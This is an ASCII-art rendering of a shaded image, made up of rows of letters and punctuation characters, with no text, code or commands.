MMMMMMMMMMMMMMMMMMMMMNmds+/:://+++osydmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhyyyyyyyyyyyyhhhdddmmmNNNNNNNMMMMMMNNNNNNNNMMMMNNNNNNmmNNNNNmhso/:::/+sydmNNMNNNmmmmmdhhdmNNNmyo-...-----:::://++osyyyssssssyyhhhhyyyhhhhhhyo/::---------:::/oyhmNmddddhhhhhdddmmmmmmNNNNNNNmmdddddmmmNNNNNNNNNNNmmmmmNNNNNmmdmNMMNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhs+-........---:+oydmNMMMMMMMMMMMMMNNmhs+/:-:::::::///:::--------------:/+shmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMNdy/...-/smNMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMNmhyssssooo+/+shmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhhyyyyyyysssssssossyhddmmmNNNNNMMMNNNmmNNMMMMNNNNNNNNNMMMNNNmdhy+/:-:/+yhmNNMMNNmmdddhsshmNNmdo/----::://////+osyhhdddhysyhddmmmdddmmmmddhs+::------:::::///oydmmmmmmmmmmmmmmmNNNNNNMMMMMMNNNNmNNNNMMMMMMMMMMMMNMMMMMMMMMNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmyo:-...........-/oydmNMMMMMMMMMMMMMNmhs/:::::://///::---.......------::/+shmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMmy/..../ymNMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMNNmddhyysso/:::+sdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmddhhyyyyysssso++++++osyhhhhdddmmNNNNmNNNMMMMMMNNNNNMMMMMNNNNNNmmhyo/::/+oydNNNNmdhdddy++smNmdyo+/::/++++oooosyyhhddmmdhyyyhhdmmmmNNNNNmmmdyo/:--.---:://////+shmmNNNNNNNNNMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdhs+:-..........:+ohdNNMMMMMMMMMMMNNmhyo/::::::::::--..........----::://+ydmNNMMMMMMMMMMMMMMMMMMMMMMMMMNmy/-.../ymNMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmddys+//:::/+ydmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmdhhyyyyssoo++////+ossssssooosyhdmmmNNNMMMMMMMMMMMMMMMMMMMMMMMNNdyo/:-:/oydmmmdhhhddhsoydmdyyssooossyyyyyyyhhhhdmmmmmdhyyyhhdmmNNNNNNNNNmhs/-..---::///////+shmNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhs+:..........-:+shmNNMMMMMMMMMMMNmdhs+::--------------....-----:::::/+sydmNMMMMMMMMMMMMMMMMMMMMMMMMNmyo-..-/ydNMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmdhs+/:://+syhdmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmddhyyysso++//://+oosssoo+/////+osyhddmNNMMMMMMMMMMMMMMMMMMMMMMNNdhs+///+oyhddhhhddmdysyhdhhhhhhhyyyyyyyyyyyhhhdmmNNNmmdhyyhhdmNNMMMMMMNmho:...---::///////+shdNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhs+:.........-:/oshmNNMMMMMMMMMMMNmhso/:-----:::::----.....---------:/oydmNMMMMMMMMMMMMMMMMMMMMMMMNmho-.../sdNMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdhs+//+ooosssshdNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmddhysso+//:::/++ossso++///::///+++oosyhdmmNNMMMMMMMMMMMMMMMMMMMMNmhyoooosyhhhhhdmmdhyhdddddmNNmdhyyyyyyyyyyhhddmNNNNmmdhhyhdmNNMMMMMMMmhs/:---:://///////+sydmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhs/:-.......--:/oydmNNMMMMMMMMMMNmdyo/:----:::------........----.---/ohdNNMMMMMMMMMMMMMMMMMMMMMMMNdo:..-/sdNMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdysssoo++//+sydmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmddhyo+/::-::/+oosooo+//::///////::::-:/+sydmNNMMMMMMMMMMMMMMMMMNNmdhhysssyyyyhdmmmdddmmNNNMMNNmdhyyyyyyyyyhhhmmNNNNNmmdhhhhdmNMMMMMMMNmyo/:-:://++++++++ooyhmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNMMMMMMMMMMMMMMMMMMMNNdhs+/--....----:+oydmNNMMMMMMMMMNNmhs/:---.................----...-:/ohmNMMMMMMMMMMMMMMMMMMMMMMMNds/-..:sdNN
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhs+//::::/+osydmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdyo/:--::/+ooooo++//:::://////:-......-:+oyhmmNMMMMMMMMMMMMMMNNNNmdhysssssyyhdmmmmmNMMMMMNNNmmdyssssyyyyyyhdmmNNNNNmmdhysydmNNMMMMMMmdyo/////+++++ooooosyhmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmmmmmmNNNMMMMMMMMMMMMMMMMMNNmhyo/--...-..--:+oydmNMMMMMMMMMMNNdy+:...............--------.....-/shmNNMMMMMMMMMMMMMMMMMMMMMNmy+---/sdN
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhs+:----:://+oshmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhs+:-::/++ooooo++//::::::::::--.........-:/oshmNNNMMMMMMMMMMMMMNNmdhyssoooshdmmNNMMMMNMMMMNNNmhso+++ossyyyhdmmNNNNNNmhsooshdNNMMMMMMmdyo+//++++oooossssyhhdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdhhhhhhdmmNNMMMMMMMMMMMMMMNNmdyo/:-.......--/oydmNMMMMMMMMMMNmho:-.............---------....-:/sdNNMMMMMMMMMMMMMMMMMMMMMNmy/:-:+sh
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmho/::------::/oydmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhs+::/+oooooo+++/::-----:---..............-:+oyhdmNNMMMMMMMMMMMNNmddyssosshdmNNNMNNNMMMMMMMMNNds+///+oossyyhdmNNMMNNmhs++oydNNMMMMMNmdyo++++++ooosssssssyhdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmdysssssyydmNNNNNMMMMMMMMMMMNmdys+:-........-:oymNNMMMMMMMMMNmho/-............-----------..-.-/sdNMMMMMMMMMMMMMMMMMMMMMNmyo:-:+o
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdyo/--..-::://+oshdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhso+oosoooo+++//::-------.................---:+oyhdNNNMMMMMMMMMNNNmdhyyssyhhdmNNNMMMMMMMMMMMNmds+/:::///++oyhmNMMMNNmhyoosydmNMMMMMNmhyo+++++oooosssssssyhdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhyssooosyhhdmmNNMMMMMMMMMMNNmhy+/-........-/ohdmMMMMMMMMMNmhs+-...........................:+ymNMMMMMMMMMMMMMMMMMMMMNmho:-:/
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhs/-.-::///::::/oyhmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhyssoooo+++//:::--.....................-------:+sydmNNMMMMMMMMMNNNmdhysssyyhdmNNMMMMMMMMMMMNmdy+:-------:/ohmNMMMNNmhysoshdNNMMMMNNmhs++/+++oooooooooooyhmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhysoooosyhddmNNNNMMMMMMMMMNmyo:-........:/sdmNMMMMMMMMNNdyo:-..........................:ohmNMMMMMMMMMMMMMMMMMMMNmy+:::
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdy+////+/:--...-:+yhmNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhyoooo+++//::--.......................-----...-:/sydmNNMMMMMMMMMNNmdyso++oshdNMMMMMMMMMMMMNmhyo/-......-:+shmNMMNNNdhyssyhmNNMMMNNdhso+++++++++++ooooosyhmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmdhyso+++osyhdmNNNMMMMMMMMNmhs/:........:+yhmNMMMMMMMNNdyo:..........................-:ohmNMMMMMMMMMMMMMMMMMMNmho/-
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdysso+:-......-/+sydmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdhyso++++//::--........................----......-:+shmNNMMMMMMMMNNmdyo+::/+ydmNMMMMMMMMMMMNNdyo/-........:+ydNNMMNNmdhhhddmNNMMNNNmdys++/+++++++++++++oshdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhso/:::/+syhdmNNMMMMMMMNmdy+:-......-:oydNMMMMMMMMNdho:-.........................-+ydNNMMMMMMMMMMMMMMMMMMNho:
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmdyo/-.....-::/+osyhdmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdhyooo++///:--.........................---........--/oydmNNMMMMMMMNNmhs/-..:+ymNMMMMMMMMMMMMNmds/-.....``.-:ohmNMMNNNNNmmmNNNMMMNNNmdhso+///////////+++oshdmNNMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhs+:-.--:/+shmNNMMMMNMNNdyo:-......-/ohmNNMMMMMMNmhs/-............--------.....:+ydNMMMMMMMMMMMMMMMMMMNhs
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdyo:.....-:::::/+osyhmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdyso+////::-..........................---..........-/oyhmNNMMMMMMNNmds/-.`-+ydNNMMMMMMMMMMMMNdy+:.........-/sdNNMMNMMMNNNNNNMMNNNNNmdys++////////+++++oshdmNNMMMMMMMMMMMMMNNNmmdddddddmmdmmmmNNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdyo/-.`..-/+sydmNMMMMMNNdyo/-......:+shmNMMMMMMMNho/-.........------:-----...-/shmNMMMMMMMMMMMMMMMMNmd
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdyo/-....-----::/+osydmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmhyo+/::--..........................................-:+shmNMMMMMMMMNmyo:...:ohmNNMMMMMMMMMMMNmdo/-.........:+ydNMMMMMMNNNNNNNNMMMMNNmdys+////++++++++ooosydmNNMMMMMMMMMMNNmddyysoo++////++oosyyhdddddmmmmmmmNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmho/-.``..-:/ohdNNNMMMNNdho/:-....-:oydNMMMMMMNmds/:-.------:::::-:::----...:+ydNMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhs/:......---::/+osyhdmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdyo/:-..............................................-/+ydNNMMMMMMMNmho/...-/shmNNNMMMMMMMMMMNds+:..........:+yhmNMMMNNNNNNMMMMMMMNNNdhyso+++++ooooo++++oyhdmNNMMMMMMMMMMNNNmmdhyso++//::///+osyyyyyyyyyyyyyhhddddmmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdy+:.`.``.-:+yhmNMMMMMNmhs+:-...-:+ydNNMMMMMNNhso/------:::::::::::----.-:+sdNNMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmdyo/-.....--:://++osyhdmmNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdyo/:-..............................................-/oshmNNMMMMMMMNmho/.`.-/shmNMMMMMMMMMMMNmds+:..........-+shmNNMMMMMMMMMMMMMMMNNNmdhysooooooo++++//+ooyhmNNMMMMMMMMMMMMNNNNNmmddhhyyssyyyyyyyyyysso++/++///+oosyyhhdmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhs/-.```..:/ohmNMMMMMNmdyo/-...-/ohmNMMMMMNNdy+::--:-::::::::::::------:ohmNMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdy+/-...-:://+++ooosyhdmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdyo/:.......................................---...-:/+syhmmNMMMMMMMNdy+:-..:ohmNMMMMMMMMMMMMNmds+:-........-:+shdNNNMMMMMMMMMMMMMMNNmmdhysoo+++++/////:/+oyhmmNNMMMMMMMMMMMMMMMMMMNNNNmmddhhyyyyyssso+//:::-------::/+oshdmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmho/-.``.-:/oydmNMMMMNmdy+/:-.-:oymNMMMMMNmhs+/--------:::::---------:/shmNMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhs+/:-::///+++o++oosyhhmmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdy+/-..............................-...........--://++osydmNMMMMMMNmdy+:.-:oydNNMMMMMMMMMMMMNmdyo/-.........:/oydmNNMMMMMMMMMMMMMNNNmmdhyso++////////:::/+sydmNNMMMMMMMMMMMMMMMMMMMMMNNmmmddhhyssoo+/:::----........-:/+osydmmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdy+:.....-:+shmNNMMNNmhs+:-.-/oymNNMMMMNmds+:----------::::::::----:ohmNNMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhso+///+++++++++++oosyhmmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhs+-..........................----------....--://+++/++syhmNNMMMMMNmhs/:::+ydmNNMMMMMMMMMMMMNmmhs+/:.......--:+sydmNNMMMMMMMMMMMMNNNNmmdhyso+//////::::/+osyhmNNNNMMMMMMMMMMMMMMMMMMMNNNNNmmddhyso+//:-----.......----::/+osyhdmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMNNdyo/-.....:/oydNNNNNmdhs+:--:+ydNMMMMMNmho/------:-::::::::::::--:+shmNMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmhysoo++/////////++osyhhdmNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdyo/-......................----------------://++++/////+oshdmNMMMMNNdho+//oshdmNNMMMMMMMMMMMMMNNdhs+/:-......-:/+sydmNMMMMMMMMMMMMMNNNmmdhyso+////::::://++oyhddmNNNMMMMMMMMMMMMMMMMMMMMMNNNNmmdhys+/::::----------------::/+osyhmNNNMMMMMMMMMMMMMMMMMMMMMMMMMNNmho/-.....-/oydmNNMNmdhs+:--/shmNMMMNNdy+:-..-:::::::::::::-----:+ymNMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmdyso++///////+++oossyhddmmNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdyo/-...................---::::::-----::/+ooooo++++//////+shmNNMMNNNdhso++osydmNMMMMMMMMMMMMMMMNmdyso/:--.....--:+oydmmNMMMMMMMMMMMNNNNmmdhyo+//::://++/++oossyhdmmNNMMMMMMMMMMMMMMMMMMMMMMMNNNmdhys+//::::::::::::---------:/+oshdmNMMMMMMMMMMMMMMMMMMMMMMMMMNNdyo/-.....-/oydNNNNNmdho/:-:+ydmNMMNNdy+:-.----::---::::::---.-/sdNMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmddhso+/////++ooooosssyyhddmmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdyo/-................--::::::::::::::/osyyyssooo++///:--:/shmNNNMNNmdyo/:-:+shmNMMMMMMMMMMMMMMMNNmdhso/:--......-:/+shdmNMMMMMMMMMMMMNNNNmdhso+//++ooo+++++ooosyhdmmNNNMMMMMMMMMMMMMMMMMMMMMMMNNmdhyo+/////////:::--........--:/osydmNNMMMMMMMMMMMMMMMMMMMMMMMNNdyo/:-....-/shmNNNMNmhs+:-:+sdNMMMNNds+-.--------:::::::--...:shNMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdhyo++++++ooooooosssyyhhhhhmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdho/-.............---:::://:::::-::+osyyyysssoo+//::--..:/oydmNNNNNmhy+:-.-/oymNMMMMMMMMMMMMMMMNNmmdhys+/:---......-:+ydmNNMMMMMMMMMMMNNNmddhyyyyhyyssooooooooosyyhdmNNNNMMMMMMMMMMMMMMMMMMMMMNNNmdhso+//////:::--...........--:+oyhmmNMMMMMMMMMMMMMMMMMMMMMMMNmdys+:-..--/oydmNMNNNdy+:--/shmNMMNmho:-....-------------...-/ymMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmmdhysoo++++++oooosssoo+++oyhdmNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdhs+:-..........--::::///::::--:/+osyyyyssso++//:---...--:oshdNNNNNmdy+:...:+ydNNMMMMMMMMMMMMMMMNNNNmdhyso/:-..````.-:+ydNNMNMMMMMMMMMMMNNNNNNmmmddhhyyyyyyssooossyhddmNNNNMMMMMMMMMMMMMMMMMMMMNNmmhyso+/////:---.............-:/+sydmNNMMMMMMMMMMMMMMMMMMMMMNNmdyo/:----:+shmNNNNNdyo:--/ohmNMMNdy/-.....-----------....-/ymNMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdhsoo+++oossssooo+//://osyhddmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdys+:-.......---::////:::----:+ossyssssoo++//::------.-:/+oydmNNNNmdhs+:--:oshmNMMMMMMMMMMMMMMMMMMMNNmmdhyo/:--..``.-/oydmNNNNNNNNNNNMMMMMMNNNNNNNmmmdddhhyyyssssyyhhdmNNNMMMMMMMMMMMMMMMMMMMMMMNmdhso+///:::--............--::/+syhmNNMMMMMMMMMMMMMMNMMMMMMNNdhs+/:--::+oydmNNNNmhs+:-:ohmNMMNds/-............-......./ohNMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdhysssssssoo+++//////++osyyhdmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdys+:--....-:::////:::---:/+osssyysssoo++/:::---------://oshdNNMNNmdy+/--:/ohdNNMMMMMMMMMMMMMMMMMMMMMNNmdhyo+/:--..-:oydmmmmmmmNNNNNMMMMMMMMMMMNNNNNmmmmdddhhhhyyyhhddmmNNMMMMMMMMMMMMMMMMMMMMMNmdhyo+////::::---........--::/+osydmmNNMMMMMMMMMMMMMMMMMMMMNmdyo/:::::/+shdNNNNmdy+/:/ohdNMNmho:....................-+hNMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdhhhyyso+++///+++++++oossyhdmmmNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdys+/:----::://::::---:/+ossyyyyyssoo+//::::::::::----:/+oshdmNNNmdys+/:/+sydmNNMMMMMMMMMMMMMMMMMMMMMMNNmmddyysoo+oosyhmmmmmNNNNNMMMMMMMMMMMMMMNNNNNNNNNmmmmmddhhhhhhdmmNNNMMMMMMMMMMMMMMMMMMNNmdhyo+//////:--........--:///++oshdmNNNNMMMMMMMMMMMMMMMMMMNmmhs+/:-:::/+ydmNNNNmds/:/ohmNNNds:....................:odNM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNmmdhysso+++++++++oosssyyhhhhhhhddmmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhyo+/::::::::----::/+ossyyyysssoo+++++///////:::::::-:/+oshdmNNNmdys+//+sydmNNNMMMMMMMMMMMMMMMMMMMMMMMNNNNNNmmmdddmNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNmddhhyyyhdmmNNMMMMMMMMMMMMMMMMMNNmdyso+///::-........--::///+++ooshddmNNMMMMMMMMMMMMMMMMMMNNdhs+:-----:/shmNNNNmho/:/ohNNNms/-...................:ohm
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdhhysooo++oossyyyyyyyyyssosssyhdmmNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhso++//::----::/+osyyyyssssssooooooo++///////////////+osyhmmNNNmhysooosyhdmNMMMMMMMMMMMMMMMMMMNNNmdmmmmNNNNNNNNMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmhyo+++oshmNNMMMMMMMMMMMMMMMMMNmmhys+/::-..........--:///++++++osyhmNNNMMMMMMMMMMMMMMMMMNNmds+/:-....:/shmNMNmho:-/sdmNmds/-..................-oh
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmddhyyssssyyyyyyyyyssoo+/:://+osyhddmNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmddhyso+/::::/+ossyyysssssssssssooo+//////++++++++++++++osyhmmNNNmdhysssyhdmNNMMMMMMMMMMMMMNNmdhysoo+osssyyddmmmNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdyo/---:+oydmNMMMMMMMMMMMMMMMMNNNmhso/-............--::////+///+osydmNNMMMMMMMMMMMMMMMMMMNmdyo/:---..-+shmNMNmyo//+ydNNNho-..................:+
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNmmddhhhhhhyyyysso++/::----:://+osyhddmmmNNNNNNNNNMMMMMMMMMMMMMMMMNNNNNmmdhysoo+++osssssssssssssssoo++//::://///+++++++///:://++sydmNNNmdhyyyyyhdmNMMMMMMMMMMMNNmmdhyo+::--..-:///++ossyhhdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdy+:--.--:+shdNNNMMMMMMMMMMMMMMMNNdyo/:-..........--::::////////+osydmNNMMMMMMMMMMMMMMMMMNNdhs+/:::-::+sdmNNNmhyooyhmNNds+-..................
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmmmmddhhyysoo+/:--...--::///++oosyhhhhhddddmmmNNNNNNNNMMMMMMMMMMMMMNNNmmmdhhyyysssssssssoooo++//:------::::///////::---..---:/oshdmmmmdhhhhhhdmmNNNMMMMMMMNNNNNmdhyso/:-....`...---::/+oydmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhyo+/::-:/+shdmNNMMMMMMMMMMMMMMMNdhs/-.........---:::::::://///++syhdNNMMMMMMMMMMMMMMMMMNNmhyo+//:::/oydmNMMNmhyydmNNmh+-.................
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmmmddhhys+/:-...---://+++ooossssssssssyyyyyyhhddmmmmNNNNNNNMMNMMMMMNNNNNmmmdddhhyssoo++//:--......----::::::---............-:/oyhdmmmmmddhhyhdmNMMMMMMMMMMMMMNNNmdhyo+:--...........-/oydmNMMMMMMMMMMMMMMMMMMMMMMMMMNNmmmmddhys++/++osydmmNNMMMMMMMMMMMMMNmho:--......---::://:::://////++osydmNNMMMMMMMMMMMMMMMNNNmhso+//:::/oymNMMMNmdddmNMNds/-...............
